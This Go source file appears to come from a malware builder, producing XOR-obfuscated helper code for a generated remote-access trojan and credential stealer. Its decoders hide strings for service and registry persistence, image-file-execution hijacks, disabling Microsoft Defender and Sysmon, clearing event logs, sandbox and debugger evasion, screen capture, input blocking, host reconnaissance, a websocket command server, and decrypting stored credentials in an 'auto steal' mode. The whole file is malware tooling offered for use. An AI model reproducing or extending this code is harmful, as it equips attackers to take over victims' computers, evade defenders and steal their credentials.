package buildergen

import "strings"

func templateHelpers() string {
	return strings.TrimSpace(`
func xor(input string, key []byte) []byte {
	raw, err := base64.StdEncoding.DecodeString(input)
	if err != nil || len(key) == 0 {
		return nil
	}
	out := make([]byte, len(raw))
	for i := 0; i < len(raw); i++ {
		out[i] = raw[i] ^ key[i%len(key)]
	}
	return out
}

func getServerHost() string {
	return string(xor(encServerHost, decryptionKey))
}

func getServiceName() string {
	return string(xor(encServiceName, decryptionKey))
}

func getDisplayName() string {
	return string(xor(encDisplayName, decryptionKey))
}

func getServiceExeName() string {
	return string(xor(encServiceExeName, decryptionKey))
}

func getWorkerExeName() string {
	return string(xor(encWorkerExeName, decryptionKey))
}

func getMutexName() string {
	return string(xor(encMutexName, decryptionKey))
}

func getSchtasksExeName() string {
	return string(xor(encSchtasksExe, decryptionKey))
}

func getProgramDataEnvName() string {
	return string(xor(encProgramDataEnv, decryptionKey))
}

func getAppDataEnvName() string {
	return string(xor(encAppDataEnv, decryptionKey))
}

func getMicrosoftDirName() string {
	return string(xor(encMicrosoftDir, decryptionKey))
}

func getWindowsDirName() string {
	return string(xor(encWindowsDir, decryptionKey))
}

func getWindowsUpdateDirName() string {
	return string(xor(encWindowsUpdateDir, decryptionKey))
}

func getAdvapi32DLL() string {
	return string(xor(encAdvapi32Dll, decryptionKey))
}

func getKernel32DLL() string {
	return string(xor(encKernel32Dll, decryptionKey))
}

func getOpenSCManagerWName() string {
	return string(xor(encOpenSCManagerWName, decryptionKey))
}

func getCreateServiceWName() string {
	return string(xor(encCreateServiceWName, decryptionKey))
}

func getCloseServiceHandleName() string {
	return string(xor(encCloseServiceHandleName, decryptionKey))
}

func getOpenServiceWName() string {
	return string(xor(encOpenServiceWName, decryptionKey))
}

func getStartServiceWName() string {
	return string(xor(encStartServiceWName, decryptionKey))
}

func getOpenProcessTokenName() string {
	return string(xor(encOpenProcessTokenName, decryptionKey))
}

func getGetTokenInformationName() string {
	return string(xor(encGetTokenInformationName, decryptionKey))
}

func getCloseHandleName() string {
	return string(xor(encCloseHandleName, decryptionKey))
}

func getPowerShellExeName() string {
	return string(xor(encPowerShellExe, decryptionKey))
}

func getPsStartProcessPrefix() string {
	return string(xor(encPsStartProcessPrefix, decryptionKey))
}

func getPsRunasSuffix() string {
	return string(xor(encPsRunasSuffix, decryptionKey))
}

func getAddMpPreferenceCmd() string {
	return string(xor(encAddMpPref, decryptionKey))
}

func getIsDebuggerPresentName() string {
	return string(xor(encIsDebuggerPresent, decryptionKey))
}

func getWsScheme() string {
	return string(xor(encWsScheme, decryptionKey))
}

func getWsPath() string {
	return string(xor(encWsPath, decryptionKey))
}

func getBuilderTokenHeader() string {
	return string(xor(encBuilderTokenHeader, decryptionKey))
}

func getOwnerName() string {
	return string(xor(encOwnerName, decryptionKey))
}

func getBuildID() string {
	return string(xor(encBuildID, decryptionKey))
}

func getBuildComment() string {
	return string(xor(encBuildComment, decryptionKey))
}

func getCmdPrefix() string {
	return string(xor(encCmdPrefix, decryptionKey))
}

func getBgPrefix() string {
	return string(xor(encBgPrefix, decryptionKey))
}

func getCmdExeName() string {
	return string(xor(encCmdExe, decryptionKey))
}

func getCmdCArg() string {
	return string(xor(encCmdCArg, decryptionKey))
}

func getMsgBoxPrefix() string {
	return string(xor(encMsgBoxPrefix, decryptionKey))
}

func getSwapMouseLeftCmd() string {
	return string(xor(encSwapMouseLeft, decryptionKey))
}

func getSwapMouseRightCmd() string {
	return string(xor(encSwapMouseRight, decryptionKey))
}

func getShutdownExeName() string {
	return string(xor(encShutdownExe, decryptionKey))
}

func getShutdownRestartArg() string {
	return string(xor(encShutdownRestart, decryptionKey))
}

func getShutdownPoweroffArg() string {
	return string(xor(encShutdownPoweroff, decryptionKey))
}

func getShutdownTimeoutArg() string {
	return string(xor(encShutdownTimeout, decryptionKey))
}

func getShutdownZeroArg() string {
	return string(xor(encShutdownZero, decryptionKey))
}

func getShakeOnCmd() string {
	return string(xor(encShakeOn, decryptionKey))
}

func getShakeOffCmd() string {
	return string(xor(encShakeOff, decryptionKey))
}

func getUser32DLL() string {
	return string(xor(encUser32Dll, decryptionKey))
}

func getGetForegroundWindowName() string {
	return string(xor(encGetForegroundWindowName, decryptionKey))
}

func getGetWindowTextWName() string {
	return string(xor(encGetWindowTextWName, decryptionKey))
}

func getGetWindowTextLengthWName() string {
	return string(xor(encGetWindowTextLengthWName, decryptionKey))
}

func getUnknownWindowLabel() string {
	return string(xor(encUnknownWindow, decryptionKey))
}

func getNoActiveWindowLabel() string {
	return string(xor(encNoActiveWindow, decryptionKey))
}

func getUntitledWindowLabel() string {
	return string(xor(encUntitledWindow, decryptionKey))
}

func getSystemParametersInfoWName() string {
	return string(xor(encSystemParametersInfoWName, decryptionKey))
}

func getBlockInputName() string {
	return string(xor(encBlockInputName, decryptionKey))
}

func getMessageBoxWName() string {
	return string(xor(encMessageBoxWName, decryptionKey))
}

func getSetCursorPosName() string {
	return string(xor(encSetCursorPosName, decryptionKey))
}

func getBlockInputOnCmd() string {
	return string(xor(encBlockInputOnCmd, decryptionKey))
}

func getBlockInputOffCmd() string {
	return string(xor(encBlockInputOffCmd, decryptionKey))
}

func getConsoleWindowName() string {
	return string(xor(encGetConsoleWindowName, decryptionKey))
}

func getShowWindowName() string {
	return string(xor(encShowWindowName, decryptionKey))
}

func getGdi32DLL() string {
	return string(xor(encGdi32Dll, decryptionKey))
}

func getGetDesktopWindowName() string {
	return string(xor(encGetDesktopWindowName, decryptionKey))
}

func getGetDCName() string {
	return string(xor(encGetDCName, decryptionKey))
}

func getCreateCompatibleDCName() string {
	return string(xor(encCreateCompatibleDCName, decryptionKey))
}

func getCreateCompatibleBitmapName() string {
	return string(xor(encCreateCompatibleBitmapName, decryptionKey))
}

func getSelectObjectName() string {
	return string(xor(encSelectObjectName, decryptionKey))
}

func getBitBltName() string {
	return string(xor(encBitBltName, decryptionKey))
}

func getGetDeviceCapsName() string {
	return string(xor(encGetDeviceCapsName, decryptionKey))
}

func getDeleteDCName() string {
	return string(xor(encDeleteDCName, decryptionKey))
}

func getReleaseDCName() string {
	return string(xor(encReleaseDCName, decryptionKey))
}

func getDeleteObjectName() string {
	return string(xor(encDeleteObjectName, decryptionKey))
}

func getGetDIBitsName() string {
	return string(xor(encGetDIBitsName, decryptionKey))
}

func getHttpPrefix() string {
	return string(xor(encHttpPrefix, decryptionKey))
}

func getHttpsPrefix() string {
	return string(xor(encHttpsPrefix, decryptionKey))
}

func getHttpsScheme() string {
	return string(xor(encHttpsScheme, decryptionKey))
}

func getSchemeSeparator() string {
	return string(xor(encSchemeSep, decryptionKey))
}

func getBgImageName() string {
	return string(xor(encBgImageName, decryptionKey))
}

func getRemotePrefix() string {
	return string(xor(encRemotePrefix, decryptionKey))
}

func getExeSuffix() string {
	return string(xor(encExeSuffix, decryptionKey))
}

func getCmdStart() string {
	return string(xor(encCmdStart, decryptionKey))
}

func getIpifyURL() string {
	return string(xor(encIpifyURL, decryptionKey))
}

func getIpApiHost() string {
	return string(xor(encIpApiHost, decryptionKey))
}

func getIpApiPath() string {
	return string(xor(encIpApiPath, decryptionKey))
}

func getIpApiQuery() string {
	return string(xor(encIpApiQuery, decryptionKey))
}

func getCountryFallback() string {
	return string(xor(encCountryFallback, decryptionKey))
}

func getWmic() string {
	return string(xor(encWmic, decryptionKey))
}

func getPsGetCpu() string {
	return string(xor(encPsGetCpu, decryptionKey))
}

func getWmicGetCpu() string {
	return string(xor(encWmicGetCpu, decryptionKey))
}

func getPsGetGpu() string {
	return string(xor(encPsGetGpu, decryptionKey))
}

func getWmicGetGpu() string {
	return string(xor(encWmicGetGpu, decryptionKey))
}

func getPsGetRam() string {
	return string(xor(encPsGetRam, decryptionKey))
}

func getWmicGetRam() string {
	return string(xor(encWmicGetRam, decryptionKey))
}

func getPsGetOs() string {
	return string(xor(encPsGetOs, decryptionKey))
}

func getWmicGetOs() string {
	return string(xor(encWmicGetOs, decryptionKey))
}

func getSystemPowerStatusName() string {
	return string(xor(encGetSystemPowerStatusName, decryptionKey))
}

func getLinuxCpuCmd() string {
	return string(xor(encLinuxCpuCmd, decryptionKey))
}

func getDarwinCpuCmd() string {
	return string(xor(encDarwinCpuCmd, decryptionKey))
}

func getUnknownCPU() string {
	return string(xor(encUnknownCPU, decryptionKey))
}

func getUnknownGPU() string {
	return string(xor(encUnknownGPU, decryptionKey))
}

func getUnknownRAM() string {
	return string(xor(encUnknownRAM, decryptionKey))
}

func getUnknownOS() string {
	return string(xor(encUnknownOS, decryptionKey))
}

func getLaptopLabel() string {
	return string(xor(encLaptopLabel, decryptionKey))
}

func getDesktopLabel() string {
	return string(xor(encDesktopLabel, decryptionKey))
}

func getShCmd() string {
	return string(xor(encShCmd, decryptionKey))
}

func getDashCArg() string {
	return string(xor(encDashCArg, decryptionKey))
}

func getSysctlCmd() string {
	return string(xor(encSysctlCmd, decryptionKey))
}

func getSysctlNameArg() string {
	return string(xor(encSysctlNameArg, decryptionKey))
}

func getXdgOpen() string {
	return string(xor(encXdgOpen, decryptionKey))
}

func getDisguisedExeName() string {
	return string(xor(encDisguisedExeName, decryptionKey))
}

func getDisguiseDir() string {
	return string(xor(encDisguiseDir, decryptionKey))
}

func getLocalAppDataEnv() string {
	return string(xor(encLocalAppDataEnv, decryptionKey))
}

func getBuilderToken() []byte {
	if encBuilderToken == "" {
		return nil
	}
	return xor(encBuilderToken, decryptionKey)
}

func decryptList(enc string) []string {
	if enc == "" {
		return nil
	}
	blob := xor(enc, decryptionKey)
	return strings.Split(string(blob), "\x00")
}

func getVmProcesses() []string          { return decryptList(encVmProcesses) }
func getSandboxProcs() []string         { return decryptList(encSandboxProcs) }
func getVmFiles() []string              { return decryptList(encVmFiles) }
func getSandboxUsers() []string         { return decryptList(encSandboxUsers) }
func getSandboxHosts() []string         { return decryptList(encSandboxHosts) }
func getVmMacPrefixes() []string        { return decryptList(encVmMacPrefixes) }
func getMitmProcs() []string            { return decryptList(encMitmProcs) }
func getMitmIssuers() []string          { return decryptList(encMitmIssuers) }
func getVmRegPaths() []string           { return decryptList(encVmRegPaths) }

func getGlobalMemoryStatusExName() string { return string(xor(encGlobalMemoryStatusExName, decryptionKey)) }
func getGetDiskFreeSpaceExWName() string  { return string(xor(encGetDiskFreeSpaceExWName, decryptionKey)) }
func getGetTickCount64Name() string       { return string(xor(encGetTickCount64Name, decryptionKey)) }
func getRegOpenKeyExWName() string        { return string(xor(encRegOpenKeyExWName, decryptionKey)) }
func getRegCloseKeyName() string          { return string(xor(encRegCloseKeyName, decryptionKey)) }
func getGetSystemMetricsName() string     { return string(xor(encGetSystemMetricsName, decryptionKey)) }
func getCreateToolhelp32SnapshotName() string { return string(xor(encCreateToolhelp32SnapshotName, decryptionKey)) }
func getProcess32FirstWName() string      { return string(xor(encProcess32FirstWName, decryptionKey)) }
func getProcess32NextWName() string       { return string(xor(encProcess32NextWName, decryptionKey)) }
func getCrypt32DLL() string               { return string(xor(encCrypt32Dll, decryptionKey)) }
func getCertOpenSystemStoreWName() string { return string(xor(encCertOpenSystemStoreWName, decryptionKey)) }
func getCertEnumCertsName() string        { return string(xor(encCertEnumCertsName, decryptionKey)) }
func getCertGetNameStringWName() string   { return string(xor(encCertGetNameStringWName, decryptionKey)) }
func getCertFreeCertCtxName() string      { return string(xor(encCertFreeCertCtxName, decryptionKey)) }
func getCertCloseStoreName() string       { return string(xor(encCertCloseStoreName, decryptionKey)) }
func getAutoStealMode() string             { return string(xor(encAutoStealMode, decryptionKey)) }

func getNtdllDLL() string                    { return string(xor(encNtdllDll, decryptionKey)) }
func getRtlAdjustPrivilegeName() string      { return string(xor(encRtlAdjustPrivilegeName, decryptionKey)) }
func getRtlSetProcessIsCriticalName() string { return string(xor(encRtlSetProcessIsCriticalName, decryptionKey)) }
func getRegCreateKeyExWName() string         { return string(xor(encRegCreateKeyExWName, decryptionKey)) }
func getSetNamedSecurityInfoWName() string   { return string(xor(encSetNamedSecurityInfoWName, decryptionKey)) }
func getNetshExeName() string                { return string(xor(encNetshExe, decryptionKey)) }
func getChangeServiceConfig2WName() string   { return string(xor(encChangeServiceConfig2WName, decryptionKey)) }
func getDefenderPoliciesPath() string        { return string(xor(encDefenderPoliciesPath, decryptionKey)) }
func getDefenderRtpPath() string             { return string(xor(encDefenderRtpPath, decryptionKey)) }
func getDefenderSpynetPath() string          { return string(xor(encDefenderSpynetPath, decryptionKey)) }
func getTamperProtectionPath() string        { return string(xor(encTamperProtectionPath, decryptionKey)) }
func getStopDefenderServiceCmd() string      { return string(xor(encStopDefenderServiceCmd, decryptionKey)) }
func getDisableDefenderTasksCmd() string     { return string(xor(encDisableDefenderTasksCmd, decryptionKey)) }
func getHKLMRunPath() string                 { return string(xor(encHKLMRunPath, decryptionKey)) }
func getHKLMRunOncePath() string             { return string(xor(encHKLMRunOncePath, decryptionKey)) }
func getIFEOBasePath() string                { return string(xor(encIFEOBasePath, decryptionKey)) }
func getIFEOTargets() []string               { return decryptList(encIFEOTargets) }
func getMonitoringTools() []string           { return decryptList(encMonitoringTools) }
func getClearAllLogsCmd() string             { return string(xor(encClearAllLogsCmd, decryptionKey)) }
func getDisableSysmonCmd() string            { return string(xor(encDisableSysmonCmd, decryptionKey)) }
func getDeleteEvtxCmd() string               { return string(xor(encDeleteEvtxCmd, decryptionKey)) }

func getRegEnumValueWName() string             { return string(xor(encRegEnumValueWName, decryptionKey)) }
func getCryptUnprotectDataName() string        { return string(xor(encCryptUnprotectDataName, decryptionKey)) }
func getLocalFreeName() string                 { return string(xor(encLocalFreeName, decryptionKey)) }
func getCreateFileWName() string               { return string(xor(encCreateFileWName, decryptionKey)) }
func getReadFileName() string                  { return string(xor(encReadFileName, decryptionKey)) }
func getGetFileSizeExName() string             { return string(xor(encGetFileSizeExName, decryptionKey)) }
func getCopyFileWName() string                 { return string(xor(encCopyFileWName, decryptionKey)) }
func getEnumDisplaySettingsWName() string      { return string(xor(encEnumDisplaySettingsWName, decryptionKey)) }
func getChangeDisplaySettingsExWName() string  { return string(xor(encChangeDisplaySettingsExWName, decryptionKey)) }
func getFindWindowWName() string               { return string(xor(encFindWindowWName, decryptionKey)) }
func getFindWindowExWName() string             { return string(xor(encFindWindowExWName, decryptionKey)) }
`)
}
